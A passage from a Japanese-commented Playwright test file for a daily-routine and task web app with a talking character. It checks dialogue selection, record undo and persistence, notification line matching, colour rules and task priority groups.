        self.assertEqual([t("head", False, base), t("head", False, base + 5000), t("head", False, base + 10000)], ["touch.head", "touch.night", "touch.head"])  # 夕方は夜の文
        self.assertEqual(t("head", True, base + 40000), "hold.head")
        self.assertEqual(self.bubble(page), "頭の長押し")
        self.assertEqual(t("neck", False, base + 80000), "touch.night")  # 文面のない場所は時間帯のセリフ

    def test_touch_by_tapping_emblem_but_not_parts_or_during_evening_offer(self):
        """紋章を押すと反応する。セリフの面・記録のボタンの上、夕方の提案中は反応しない"""
        page = self.scene_page(10, 0)
        box = page.eval_on_selector("#portrait", "e => { const r = e.getBoundingClientRect(); return [r.left + r.width / 2, r.top + r.height / 2]; }")
        before = self.bubble(page)
        page.mouse.click(*box)
        self.assertEqual(self.bubble(page), "昼のタッチ")
        page.evaluate("document.getElementById('bubble-text').textContent = 'そのまま'")
        page.click("#bubble-text")
        page.click("#records-more")
        page.click("#records-sheet-close")
        self.assertEqual(self.bubble(page), "そのまま")
        page.evaluate("document.getElementById('bubble-choices').hidden = false")
        page.mouse.click(*box)
        self.assertEqual(self.bubble(page), "そのまま")
        page.evaluate("document.getElementById('bubble-choices').hidden = true")
        page.mouse.move(*box)
        page.mouse.down()
        page.clock.run_for(800)
        page.mouse.up()
        self.assertEqual(self.bubble(page), "昼のタッチ")  # 場所のない長押しは通常のタッチ
        self.assertNotEqual(before, None)

    def test_scene_first_launch_only_for_new_users(self):
        """初回起動（D-083 ③）：記録・日報・タスクがないときだけ、ホームで1回。前から使っている人には出さない"""
        page = self.scene_page(10, 0)
        self.assertEqual(self.bubble(page), "初回")
        page.reload()
        page.wait_for_function("dialogue !== null")
        page.wait_for_timeout(200)
        self.assertNotEqual(self.bubble(page), "初回")
        page = self.scene_page(10, 0, init=MOOD_NORMAL)
        self.assertNotEqual(self.bubble(page), "初回")

    def test_scene_care_lines_once_a_day_and_priority(self):
        """翌日の再訪（疲れた次の日・就寝が遅かった次の日）・疲れた日は1日1回。節目より先。2回目に開くと次の候補（D-083 ④）"""
        reports = {"2026-11-08": {"mood": "tired", "savedAt": 1}}
        records = {"2026-11-03": {"wake": {"time": "07:00", "at": 1}}, "2026-11-08": {"sleep": {"time": "01:30", "at": 2}}}
        init = "localStorage.setItem('db.reports', %s); localStorage.setItem('db.records', %s);" % (json.dumps(json.dumps(reports)), json.dumps(json.dumps(records)))
        page = self.scene_page(8, 0, init=init)  # 11/3 から使って 11/9 は7日目
        self.assertEqual(self.bubble(page), "疲れた翌日")
        opens = []
        for _ in range(3):
            page.reload()
            page.wait_for_function("dialogue !== null")
            page.wait_for_timeout(150)
            opens.append(self.bubble(page))
        self.assertEqual(opens[:2], ["遅寝の翌日", "7日目"])
        self.assertNotIn(opens[2], ["疲れた翌日", "遅寝の翌日", "7日目"])  # どれも出したので、ふだんの一言
        tired = "localStorage.setItem('db.reports', JSON.stringify({ '2026-11-09': { mood: 'tired', savedAt: 1 } }));"
        page = self.scene_page(13, 0, init=tired)
        self.assertEqual(self.bubble(page), "疲れた日")

    def test_scene_tasks_progress_when_back_home(self):
        """タスクを完了してホームに戻ると、今日の進み具合（残りあり／今日までの分が全部）。増えていなければ出さない"""
        tasks = [{"id": "a", "title": "見積もり", "due": "2026-11-09", "done": False, "createdAt": 1},
                 {"id": "b", "title": "請求書", "due": "2026-11-09", "done": False, "createdAt": 2}]
        init = "localStorage.setItem('db.tasks', %s);" % json.dumps(json.dumps(tasks)) + MOOD_NORMAL
        page = self.scene_page(11, 0, init=init)
        first = self.bubble(page)
        page.evaluate("location.hash = '#tasks'")
        page.click("#task-list .task-item[data-id=a] .task-done-btn")
        page.evaluate("location.hash = '#home'")
        self.assertEqual(self.bubble(page), "1つ片づいた。残り1")
        page.evaluate("location.hash = '#tasks'")
        page.evaluate("location.hash = '#home'")
        self.assertEqual(self.bubble(page), "1つ片づいた。残り1")  # 増えていなければ変えない
        page.evaluate("location.hash = '#tasks'")
        page.click("#task-list .task-item[data-id=b] .task-done-btn")
        page.evaluate("location.hash = '#home'")
        self.assertEqual(self.bubble(page), "全部片づいた")
        self.assertNotEqual(first, None)

    def test_scene_rare_once_a_day(self):
        """レア：開いたときに低い確率で、1日1回まで"""
        init = MOOD_NORMAL + "localStorage.setItem('db.tasks', '[]'); Math.random = () => 0;"
        page = self.scene_page(11, 0, init=init + "localStorage.setItem('db.records', JSON.stringify({ '2026-11-08': { wake: { time: '07:00', at: 1 } } }));")
        self.assertEqual(self.bubble(page), "レア")
        page.reload()
        page.wait_for_function("dialogue !== null")
        page.wait_for_timeout(150)
        self.assertNotEqual(self.bubble(page), "レア")

    def test_real_lines_by_tone_and_ahau_bubble(self):
        """本物のセリフ集（D-085）：話し方ごとの文が出る。アハウの合いの手はホームの小さな吹き出しに分け、次のセリフ・ほかの画面で消える。通知はキィニチの文だけ"""
        ctx = self.browser.new_context(permissions=["notifications"], viewport={"width": 375, "height": 667})
        self.addCleanup(ctx.close)
        ctx.add_init_script(READY)
        page = ctx.new_page()
        errors = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], "JSエラーが出ている"))
        page.goto(self.base + "real/index.html?mode=standalone")
        page.wait_for_function("dialogue !== null && dialogue.touch")
        real = json.loads((APP_DIR / "data" / "dialogue.json").read_text(encoding="utf-8"))
        cond = lambda t, i: next(c for c in real[t]["conditions"] if c["id"] == i)
        self.assertEqual(page.evaluate("candidates('record_done.breakfast')"), cond("record_done", "breakfast")["lines"])
        page.evaluate("Prefs.set('tone', 'sweet')")
        self.assertEqual(page.evaluate("candidates('record_done.breakfast')"), cond("record_done", "breakfast")["lines_sweet"])
        page.evaluate("Prefs.set('tone', 'client')")
        rapid = cond("touch", "rapid")["lines"][2]
        kinich, ahau = [x.strip() for x in rapid.split("／ アハウ：")]
        page.evaluate("showLine('touch.rapid', { index: 2 })")
        self.assertEqual(page.text_content("#bubble-text"), kinich)
        self.assertTrue(page.is_visible("#ahau-line"))
        self.assertEqual(page.text_content("#ahau-text"), ahau)
        box = page.eval_on_selector_all("#ahau-line, .dialogue", "els => els.map(e => e.getBoundingClientRect()).map(r => [r.left, r.right, r.bottom, r.top])")
        self.assertLessEqual(box[0][2], box[1][3] + 1)  # セリフの面に重ならない（上に出る）
        self.assertLessEqual(box[0][1], 375)
        page.evaluate("showLine('touch.day')")
        self.assertTrue(page.is_hidden("#ahau-line"))  # 合いの手のないセリフでは消える
        page.evaluate("showLine('touch.rapid', { index: 2 })")
        page.evaluate("location.hash = '#tasks'")
        self.assertTrue(page.is_hidden("#ahau-line"))  # ほかの画面へ移ったら消える
        self.assertEqual(page.evaluate("kinichOnly(%s)" % json.dumps(rapid)), kinich)  # 通知・ほかの画面はキィニチの文だけ
        bodies = page.evaluate("Object.values(Voice.plan(new Date())).map((v) => v.body)")
        self.assertFalse(any("アハウ" in b for b in bodies), bodies)

    def test_notification_finds_same_line_when_order_changed(self):
        """通知の URL の h（文の印）で、セリフ集の並びが変わっても通知と同じ文を出す。見つからなければ選び直す（D-081）"""
        lines = ["わかった。何かあったら声をかけてくれ。", "了解。進捗、気になったらこっちから聞く。"]
        page = self.clock_page(9, 3)
        h1 = page.evaluate("lineHash(%s)" % json.dumps(lines[1]))
        # 予約したときは2番目（line=1）だったが、並びが入れ替わって今は1番目（line=0）にあるつもり：line=0 と 2番目の印
        page = self.clock_page(9, 3, "&source=webpush&trigger=work_start.default&line=0&h=" + h1)
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        self.assertEqual(page.text_content("#bubble-text"), lines[1])
        self.assertNotIn("h=", page.evaluate("location.search"))  # 使い終えたら URL から外す
        # 番号と印が合っていればそのまま
        page = self.clock_page(9, 3, "&source=webpush&trigger=work_start.default&line=1&h=" + h1)
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        self.assertEqual(page.text_content("#bubble-text"), lines[1])
        # 文が変わって見つからないときは、番号に頼らず候補から選ぶ（違う文を「通知の文」として出さない）
        page = self.clock_page(9, 3, "&source=webpush&trigger=work_start.default&line=0&h=zzzz")
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        self.assertIn(page.text_content("#bubble-text"), lines)
        # 声掛けの予約の URL にも印が付く
        url = page.evaluate("Object.values(Voice.plan(new Date(2026, 10, 9, 9, 3)))[0].url")
        body = page.evaluate("Object.values(Voice.plan(new Date(2026, 10, 9, 9, 3)))[0].body")
        self.assertIn("&h=" + page.evaluate("lineHash(%s)" % json.dumps(body)), url)

    def primaries(self, page):
        return page.eval_on_selector_all(".act.primary", "els => els.map(e => e.dataset.record)")

    def test_only_one_primary_action(self):
        page = self.clock_page(7, 12)
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        self.assertEqual(self.primaries(page), ["wake"])
        page = self.clock_page(11, 30)
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        self.assertEqual(self.primaries(page), ["work_start"])
        page = self.clock_page(12, 41, "&source=webpush&trigger=midday_check.meal_overdue&line=0")
        page.wait_for_function("document.body.classList.contains('from-notification')", timeout=3_000)
        self.assertEqual(self.primaries(page), ["work_start"])  # 通知から開いても記録ボタンは普段どおり（D-024）
        self.assertIsNone(page.query_selector("#play-voice"))

    ACCENT_SCAN = """(allowedBorder) => {
      const ACCENT = 'rgb(232, 196, 92)';
      const els = [...document.querySelectorAll('#view-home *, .tabbar, .tabbar *')]
        .filter((e) => e.getClientRects().length > 0);           // 表示されているものだけ
      const bg = els.filter((e) => getComputedStyle(e).backgroundColor === ACCENT);
      const borderOf = (e) => ['Top', 'Right', 'Bottom', 'Left'].some((k) => {
        const cs = getComputedStyle(e);
        return cs['border' + k + 'Style'] !== 'none' && parseFloat(cs['border' + k + 'Width']) > 0 && cs['border' + k + 'Color'] === ACCENT;
      });
      const tabActive = (e) => !!e.closest('.tabbar a[aria-current]');
      const colorBad = els.filter((e) => getComputedStyle(e).color === ACCENT && !e.closest('.nameplate') && !tabActive(e) && !bg.includes(e));
      const borderBad = els.filter((e) => borderOf(e) && !bg.includes(e) && !allowedBorder.some((sel) => e.matches(sel)));
      const name = (e) => e.id || e.className || e.tagName;
      return { bg: bg.map(name), colorBad: colorBad.map(name), borderBad: borderBad.map(name) };
    }"""

    def test_accent_usage_on_home(self):
        # 通常（7:12）：金の塗りは 1 つ、金の文字・枠は名前欄と選択中のタブだけ（V3-08）
        page = self.clock_page(7, 12)
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        r = page.evaluate(self.ACCENT_SCAN, [".nameplate"])
        self.assertEqual(len(r["bg"]), 1, r)
        self.assertEqual(r["colorBad"], [], r)
        self.assertEqual(r["borderBad"], [], r)
        # 通知から開いた直後（12:41）：塗りは主ボタン（仕事開始）1つだけ（D-024）
        page = self.clock_page(12, 41, "&source=webpush&trigger=midday_check.meal_overdue&line=0")
        page.wait_for_function("document.body.classList.contains('from-notification')", timeout=3_000)
        r = page.evaluate(self.ACCENT_SCAN, [".nameplate"])
        self.assertEqual(len(r["bg"]), 1, r)
        self.assertEqual(r["borderBad"], [], r)

    # ---------- 記録の完了表示・取り消し・当日分の保存（T09, D-019 Q7=保存する） ----------
    def test_record_shows_done_state_and_can_be_undone(self):
        page = self.clock_page(7, 12)
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        before = page.text_content("#bubble-text")
        page.click(".act[data-record=wake]")
        self.assertEqual(page.text_content(".act[data-record=wake]"), "✓ 起きた 07:12")
        self.assertIn("done", page.get_attribute(".act[data-record=wake]", "class"))
        self.assertTrue(page.is_visible("#toast"))
        self.assertIn("「起きた」を記録しました", page.text_content("#toast"))
        self.assertIn(page.text_content("#bubble-text"), self.lines_of("morning_wake", "on_time"))
        undo = page.eval_on_selector("#toast .undo", "e => e.getBoundingClientRect().height")
        self.assertGreaterEqual(undo, 44)
        page.click("#toast .undo")
        self.assertEqual(page.text_content(".act[data-record=wake]"), "起きた")
        self.assertFalse(page.is_visible("#toast"))
        self.assertEqual(page.text_content("#bubble-text"), before)
        self.assertEqual(self.primaries(page), ["wake"])
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.records')")), {})

    def test_toast_disappears_after_5_seconds(self):
        page = self.clock_page(7, 12)
        page.click(".act[data-record=wake]")
        page.clock.run_for(5_100)
        self.assertFalse(page.is_visible("#toast"))
        self.assertEqual(page.text_content(".act[data-record=wake]"), "✓ 起きた 07:12")

    def test_tapping_done_button_reopens_undo(self):
        page = self.clock_page(7, 12)
        page.click(".act[data-record=wake]")
        page.clock.run_for(6_000)
        self.assertFalse(page.is_visible("#toast"))
        line = page.text_content("#bubble-text")
        page.click(".act[data-record=wake]")
        self.assertTrue(page.is_visible("#toast"))
        self.assertEqual(page.text_content(".act[data-record=wake]"), "✓ 起きた 07:12")  # 新しい記録はしない
        page.click("#toast .undo")
        self.assertEqual(page.text_content(".act[data-record=wake]"), "起きた")
        self.assertEqual(page.text_content("#bubble-text"), line)  # 出し直したトーストからの取り消しではセリフを変えない

    def test_record_persists_for_today(self):
        page = self.clock_page(7, 12)
        page.click(".act[data-record=wake]")
        page.reload()
        page.wait_for_function("dialogue !== null", timeout=3_000)
        self.assertEqual(page.text_content(".act[data-record=wake]"), "✓ 起きた 07:12")
        self.assertEqual(self.primaries(page), ["breakfast"])  # 起きたは記録済みなので次（朝食）が主（D-046）
        saved = page.evaluate("localStorage.getItem('db.records')")
        self.assertEqual(json.loads(saved)["2026-11-09"]["wake"]["time"], "07:12")
        # 翌日の日付で開くと未記録。前の日の記録は消さずに残し、新しい日の分を足す（D-043）
        page2 = self.clock_page(7, 30, day=10, init_script="if (!localStorage.getItem('db.records')) localStorage.setItem('db.records', %s)" % json.dumps(saved))
        self.assertEqual(page2.text_content(".act[data-record=wake]"), "起きた")
        self.assertEqual(self.primaries(page2), ["wake"])
        page2.click(".act[data-record=wake]")
        both = json.loads(page2.evaluate("localStorage.getItem('db.records')"))
        self.assertEqual({d: v["wake"]["time"] for d, v in both.items()}, {"2026-11-09": "07:12", "2026-11-10": "07:30"})

    def test_done_label_fits_on_small_screen(self):
        page = self.clock_page(9, 3, size=(375, 667), safe=(20, 0))
        page.click(".act[data-record=work_start]")
        self.assertEqual(page.text_content(".act[data-record=work_start]"), "✓ 仕事開始 09:03")
        sw, cw = page.eval_on_selector(".act[data-record=work_start]", "e => [e.scrollWidth, e.clientWidth]")
        self.assertLessEqual(sw, cw)

    def lines_of(self, trigger, cond_id):
        data = json.loads(FIXTURE_DIALOGUE.read_text(encoding="utf-8"))
        return [c for c in data[trigger]["conditions"] if c["id"] == cond_id][0]["lines"]

    # ---------- 開いたときの判定し直し（T10） ----------
    def hide_and_return(self, page, ms):
        page.evaluate("window.__vis = 'hidden'; document.dispatchEvent(new Event('visibilitychange'))")
        page.clock.fast_forward(ms)
        page.evaluate("window.__vis = 'visible'; document.dispatchEvent(new Event('visibilitychange'))")

    def test_resume_after_long_hide_refreshes_home(self):
        page = self.clock_page(7, 12, "&source=webpush&trigger=midday_check.meal_overdue&line=0")
        page.wait_for_function("document.body.classList.contains('from-notification')", timeout=3_000)
        self.hide_and_return(page, 15 * 3600 * 1000)  # 15時間後（22:12）に戻る
        self.assertEqual(page.get_attribute("body", "data-period"), "night")
        self.assertFalse(page.evaluate("document.body.classList.contains('from-notification')"))
        self.assertIn(page.text_content("#bubble-text"), self.idle_lines("night"))
        self.assertEqual(page.text_content("#clock-time"), "22:12")

    def test_short_hide_keeps_line(self):
        page = self.clock_page(7, 12, "&source=webpush&trigger=midday_check.meal_overdue&line=0")
        page.wait_for_function("document.body.classList.contains('from-notification')", timeout=3_000)
        line = page.text_content("#bubble-text")
        self.hide_and_return(page, 5 * 60 * 1000)
        self.assertEqual(page.text_content("#bubble-text"), line)
        self.assertTrue(page.evaluate("document.body.classList.contains('from-notification')"))

    def test_sw_message_fallback_applies_trigger(self):
        page = self.clock_page(12, 41)
        page.wait_for_function("document.getElementById('bubble-text').textContent !== '…'", timeout=3_000)
        page.evaluate("""navigator.serviceWorker.dispatchEvent(new MessageEvent('message', { data: {
          type: 'open-url', url: location.origin + '/index.html?source=webpush&trigger=midday_check.meal_overdue&line=0' } }))""")
        page.wait_for_function("document.body.classList.contains('from-notification')", timeout=3_000)
        self.assertEqual(page.text_content("#bubble-text"), "そろそろ飯の時間、過ぎてるぞ。食べたら開いて押しておけ。")
        self.assertEqual(self.primaries(page), ["work_start"])

    def test_records_reload_when_date_changes(self):
        # 1日の区切りは朝4時（D-034）。0時をまたいでも今日の記録のまま、4時をまたぐと新しい日になる
        page = self.clock_page(23, 58)
        page.click(".act[data-record=sleep]")
        self.assertIn("done", page.get_attribute(".act[data-record=sleep]", "class"))
        page.clock.run_for(3 * 60 * 1000)  # 0:01 になる
        self.assertIn("done", page.get_attribute(".act[data-record=sleep]", "class"))
        page.clock.fast_forward(4 * 3600 * 1000)  # 4:01 になる
        page.clock.run_for(1500)
        self.assertEqual(page.evaluate("Object.keys(Records.day())"), [])
        self.assertEqual(page.eval_on_selector_all(".act", "els => els.map(e => e.dataset.record)"), ["wake"])

    def test_records_before_4am_belong_to_previous_day(self):
        # フェーズ1の保存の形（records.today）から開く＝引き継ぎも兼ねて確かめる
        saved = json.dumps({"date": "2026-11-09", "items": {"wake": "07:12"}})
        page = self.clock_page(1, 30, day=10, init_script="localStorage.setItem('records.today', %s)" % json.dumps(saved))
        self.assertEqual(page.evaluate("Records.day().wake.time"), "07:12")
        page = self.clock_page(4, 0, day=10, init_script="localStorage.setItem('records.today', %s)" % json.dumps(saved))
        self.assertEqual(page.text_content(".act[data-record=wake]"), "起きた")

    # ---------- 夜の配色（T11, D-019 Q5=暗くする） ----------
    def test_night_palette(self):
        page = self.clock_page(23, 48)
        self.assertEqual(page.get_attribute("body", "data-period"), "night")
        self.assertEqual(page.evaluate("getComputedStyle(document.body).backgroundColor"), "rgb(16, 38, 31)")  # D-021
        page = self.clock_page(13, 0)
        self.assertEqual(page.evaluate("getComputedStyle(document.body).backgroundColor"), "rgb(24, 58, 47)")  # D-021

    # ---------- 見た目の決まり v7（D-021, D-022） ----------
    def test_line_enter_animation_runs_and_stops_with_reduced_motion(self):
        page = self.clock_page(7, 12)
        page.wait_for_function("document.getElementById('bubble-text').classList.contains('line-enter')", timeout=3_000)
        self.assertEqual(page.eval_on_selector("#bubble-text", "e => getComputedStyle(e).animationName"), "hook-in")
        page.emulate_media(reduced_motion="reduce")
        self.assertEqual(page.eval_on_selector("#bubble-text", "e => getComputedStyle(e).animationName"), "none")

    def test_focus_shows_gold_edge_on_cut_buttons(self):
        page = self.clock_page(13, 30)  # 休憩は主ボタンにならない（D-046）
        page.keyboard.press("Tab")
        page.focus(".act[data-record=break]")
        page.keyboard.press("Shift+Tab")
        page.keyboard.press("Tab")
        bg = page.eval_on_selector(".act[data-record=break]",
                                   "e => e.matches(':focus-visible') ? getComputedStyle(e).backgroundColor : 'not-focus-visible'")
        self.assertEqual(bg, "rgb(232, 196, 92)")

    def test_portrait_shows_when_image_is_placed(self):
        import base64
        png = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=")
        ctx = self.browser.new_context(permissions=["notifications"])
        self.addCleanup(ctx.close)
        ctx.add_init_script(READY)
        # 画面の route だと、Service Worker が先に動き出したときにその取得を素通りする。ブラウザ全体（ctx）で差し替える
        ctx.route("**/img/portrait.webp", lambda r: r.fulfill(status=200, content_type="image/png", body=png))
        page = ctx.new_page()
        page.goto(self.base + "index.html?mode=standalone")
        page.wait_for_function("document.getElementById('portrait').dataset.art === 'ready'", timeout=3_000)
        self.assertEqual(page.get_attribute("#portrait", "role"), "img")
        self.assertIsNone(page.get_attribute("#portrait", "aria-hidden"))
        bgimg = page.eval_on_selector("#portrait", "e => getComputedStyle(e).backgroundImage")
        self.assertIn("portrait.webp", bgimg)
        self.assertNotIn("emblem", bgimg)

    def test_emblem_shows_without_portrait(self):
        page = self.clock_page(7, 12)
        page.wait_for_timeout(300)
        self.assertEqual(page.get_attribute("#portrait", "data-art"), "none")
        self.assertEqual(page.get_attribute("#portrait", "aria-hidden"), "true")
        self.assertIn("canopy-emblem", page.eval_on_selector("#portrait", "e => getComputedStyle(e).backgroundImage"))

    def test_fret_band_does_not_overlap_record_buttons(self):
        for size, safe in DEVICES:
            with self.subTest(size=size):
                page = self.clock_page(9, 3, size=size, safe=safe)
                gap = page.evaluate("""() => {
                  const act = document.querySelector('.act').getBoundingClientRect();
                  const tb = document.querySelector('.tabbar');
                  const h = parseFloat(getComputedStyle(tb, '::before').height);
                  return tb.getBoundingClientRect().top - h - act.bottom;
                }""")
                self.assertGreaterEqual(gap, 0)

    def test_toast_edge_drawn_with_before(self):
        page = self.clock_page(7, 12)
        page.click(".act[data-record=wake]")
        r = page.evaluate("""() => { const t = document.getElementById('toast'); const cs = getComputedStyle(t);
          return { border: cs.borderTopStyle, clip: cs.clipPath !== 'none', before: getComputedStyle(t, '::before').content }; }""")
        self.assertEqual(r["border"], "none")
        self.assertTrue(r["clip"])
        self.assertEqual(r["before"], '""')

    def test_no_voice_button(self):
        # 声の再生は見送り（D-023）。ボタンも音のファイルもない
        page = self.clock_page(12, 41, "&source=webpush&trigger=midday_check.meal_overdue&line=0")
        self.assertIsNone(page.query_selector("#play-voice"))
        self.assertIsNone(page.query_selector("#audio-status"))
        sw = (APP_DIR / "sw.js").read_text(encoding="utf-8")
        self.assertNotIn("audio", sw)
        self.assertFalse((APP_DIR / "audio").exists())

    # ---------- R5（2026-11-18）：スイッチ・記録の一覧・先週のひとこと・控えの失敗 ----------
    def test_switch_shows_state_with_track_and_knob(self):
        """スイッチは溝とつまみで状態を見せ、オンはライム（CR-F07）。文字（オン／オフ）とaria-checkedはそのまま。"""
        page = self.clock_page(21, 0, "#settings")
        page.evaluate("() => { const s = document.styleSheets[0]; s.insertRule('*, *::before, *::after { transition: none !important; }', s.cssRules.length); }")  # 動きの途中の色を読まない
        track = lambda: page.evaluate("getComputedStyle(document.getElementById('pref-lines'), '::before').backgroundColor")
        self.assertEqual(track(), "rgb(185, 227, 95)")
        page.click("#pref-lines")
        self.assertEqual(page.get_attribute("#pref-lines", "aria-checked"), "false")
        self.assertNotEqual(track(), "rgb(185, 227, 95)")
        size = page.eval_on_selector("#pref-lines", "e => [e.getBoundingClientRect().width, e.getBoundingClientRect().height]")
        self.assertTrue(size[0] >= 44 and size[1] >= 44, size)

    def test_holiday_days_in_one_row(self):
        """休日の曜日 7 つは折り返さず 1 本の帯に並び、どれも 44px 以上（CR-F09）。"""
        page = self.clock_page(21, 0, "#schedule", size=(375, 667))
        page.click("#routine-open")  # 毎日の時刻は予定の画面に移した（D-060 ⑭）
        boxes = page.eval_on_selector_all("#routine-holidays .cut-btn", "els => els.map(e => { const r = e.getBoundingClientRect(); return [Math.round(r.top), r.width, r.height]; })")
        self.assertEqual(len({b[0] for b in boxes}), 1, boxes)
        self.assertTrue(all(w >= 44 and h >= 44 for _, w, h in boxes), boxes)

    def test_records_sheet_skip_is_quiet(self):
        """記録の一覧の「今日はなし」は文字だけの控えめな操作、「記録」が行の主な操作（CR-F08）。"""
        page = self.clock_page(8, 0)
        page.click("#records-more")
        row = "#records-list li[data-record=breakfast]"
        self.assertIn("skip", page.get_attribute(row + " button:text-is('今日はなし')", "class"))
        self.assertIn("rec", page.get_attribute(row + " button:text-is('記録')", "class"))

    def test_weekly_on_top_on_first_day_then_back(self):
        """先週のひとことは、週が明けて最初に見た日は日報の上、次の日からは「これまで」の上（CR-G05）。何から作ったかを添える。"""
        page, _ = self.weekly_page(self.WEEK_REPORTS)
        page.wait_for_selector("#weekly", state="visible", timeout=5_000)
        order = lambda: page.evaluate("document.getElementById('weekly').compareDocumentPosition(document.getElementById('report-form')) & Node.DOCUMENT_POSITION_FOLLOWING ? 'above' : 'below'")
        self.assertEqual(order(), "above")
        self.assertIn("日報 3 日分", page.text_content("#weekly-basis"))
        self.assertIn("Claude（AI）", page.text_content("#weekly-basis"))
        self.assertTrue(page.is_hidden("#report-say"))  # その日は一言の面を 1 つに
        self.assertEqual(page.evaluate("JSON.parse(localStorage.getItem('db.weekly'))['2026-11-09'].firstSeen"), "2026-11-16")
        # 次の日（同じ週の火曜）：「これまで」の上に戻り、上の一言も戻る
        saved = page.evaluate("localStorage.getItem('db.weekly')")
        page2, calls2 = self.weekly_page(self.WEEK_REPORTS, day=17, extra_init="localStorage.setItem('db.weekly', %s);" % json.dumps(saved))
        page2.wait_for_selector("#weekly", state="visible", timeout=5_000)
        self.assertEqual(page2.evaluate("document.getElementById('weekly').compareDocumentPosition(document.getElementById('report-form')) & Node.DOCUMENT_POSITION_FOLLOWING ? 'above' : 'below'"), "below")
        self.assertTrue(page2.is_visible("#report-say"))
        self.assertEqual(calls2, [])

    def test_sync_error_shown_on_settings(self):
        """スプレッドシートへの控えが失敗したら、設定のいちばん上に出す（CR-F11）。"""
        init = "localStorage.setItem('db.sync', JSON.stringify({ url: 'https://script.google.com/macros/s/offline/exec', token: 't', lastAt: 0, lastSig: '', dirty: true, error: '通信できません' }));"
        page = self.clock_page(21, 0, "#settings", init_script=init, routes={"https://script.google.com/**": lambda r: r.abort()})
        page.wait_for_selector("#sync-alert", state="visible", timeout=3_000)
        self.assertIn("送れていません（通信できません）", page.text_content("#sync-alert"))
        page2 = self.clock_page(21, 0, "#settings")
        self.assertTrue(page2.is_hidden("#sync-alert"))

    # ---------- 機能画面の決まり（R4。CR-F / CR-G） ----------
    def test_tabbar_stays_above_sticky_day_header(self):
        """予定の貼り付く日付の見出しが、タブバーの上に重ならない（R4 の不具合修正）。"""
        page = self.clock_page(20, 30, "#schedule", size=(375, 667))
        page.wait_for_selector("#view-schedule", state="visible", timeout=3_000)
        page.wait_for_selector(".schedule-day-title", timeout=3_000)
        z = page.evaluate("['.tabbar', '.schedule-day-title'].map(s => Number(getComputedStyle(document.querySelector(s)).zIndex))")
        self.assertGreater(z[0], z[1])
        # 画面の下端（タブの位置）にあるのはタブバー
        hit = page.evaluate("document.elementFromPoint(innerWidth / 2, innerHeight - 20).closest('.tabbar') !== null")
        self.assertTrue(hit)

    def test_task_groups_follow_priority(self):
        """未完了のタスクは優先度ごとの見出し（▲高・●中・▼低・なし）に分かれ、中は期限の近い順（D-070、CR-G07）。"""
        tasks = [
            {"id": "1", "title": "古い", "due": "2026-11-07", "done": False, "createdAt": 1},
            {"id": "2", "title": "高・期限なし", "due": None, "priority": "high", "done": False, "createdAt": 2},
            {"id": "3", "title": "高・今日", "due": "2026-11-09", "priority": "high", "done": False, "createdAt": 3},
            {"id": "4", "title": "低", "due": None, "priority": "low", "done": False, "createdAt": 4},
            {"id": "5", "title": "変な値", "due": None, "priority": "urgent", "done": False, "createdAt": 5},
        ]
        page = self.tasks_page(tasks=tasks)
        heads = page.eval_on_selector_all("#task-list .task-group", "els => els.map(e => [e.dataset.priority, e.querySelector('.prio-tag').textContent])")
        self.assertEqual(heads, [["high", "▲高（2）▾"], ["mid", "●中▾"], ["low", "▼低（1）▾"], ["none", "なし（2）▾"]])
        self.assertEqual(self.open_titles(page), ["高・今日", "高・期限なし", "低", "古い", "変な値"])
        self.assertIn("期限切れ", page.text_content("#task-list li[data-id='1']"))  # 期限切れの表示は行に残す
        slots = page.eval_on_selector_all("#task-list .add-slot", "els => els.map(e => e.textContent)")
        self.assertEqual(slots, ["通常の作業＋"])  # 点線の欄はタスクのない優先度だけ
        pluses = page.eval_on_selector_all("#task-list .add-plus", "els => els.map(e => e.closest('.task-group').dataset.priority)")
        self.assertEqual(pluses, ["high", "low", "none"])  # タスクのある優先度は見出しの右の ＋
        self.assertEqual(page.get_attribute("#task-list .task-group[data-priority=high] .add-plus", "aria-label"), "集中が必要（優先度 高）のタスクを追加")
        # ＋ は完了の四角の上にそろう
        xs = page.evaluate("""() => ['.task-group[data-priority=high] .add-plus', 'li[data-id="3"] .task-done-btn']
          .map((q) => { const r = document.querySelector('#task-list ' + q).getBoundingClientRect(); return [Math.round(r.left), Math.round(r.right)]; })""")
        self.assertEqual(xs[0], xs[1])
        self.assertEqual(page.get_attribute("#task-list .task-group[data-priority=high] .prio-tag", "aria-label"), "優先度 高、2件。たたむ")
        # 古いデータ（優先度・ミニタスクなし）は「なし」「ミニタスクなし」として読む
        self.assertEqual(page.query_selector_all("#task-list .sub-bar"), [])

    def test_task_group_fold_is_remembered(self):
        """見出しを押すとたたみ、アプリを閉じても覚えている（D-070）。"""
        tasks = [{"id": "a", "title": "高い", "due": None, "priority": "high", "done": False, "createdAt": 1}]
        page = self.tasks_page(tasks=tasks)
        page.click("#task-list .task-group[data-priority=high] .prio-tag")
        self.assertEqual(self.open_titles(page), [])
        self.assertEqual(page.get_attribute("#task-list .task-group[data-priority=high] .prio-tag", "aria-expanded"), "false")
        self.assertEqual(page.query_selector_all("#task-list .task-slot[data-priority=high]"), [])  # たたむと追加の欄も隠す
        self.assertIn("高（1）", page.text_content("#task-list .task-group[data-priority=high]"))  # 件数は見える
        page.reload()
        page.wait_for_selector("#view-tasks", state="visible")
        self.assertEqual(self.open_titles(page), [])
        page.click("#task-list .task-group[data-priority=high] .prio-tag")
        self.assertEqual(self.open_titles(page), ["高い"])
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.prefs')"))["taskFolded"], [])

    def test_add_task_from_priority_slot(self):
        """各優先度の下の点線の欄から、その優先度のタスクを作れる。フォームはその欄に開く（D-070）。"""
        page = self.tasks_page()
        page.click("#task-list .task-slot[data-priority=mid] .add-slot")
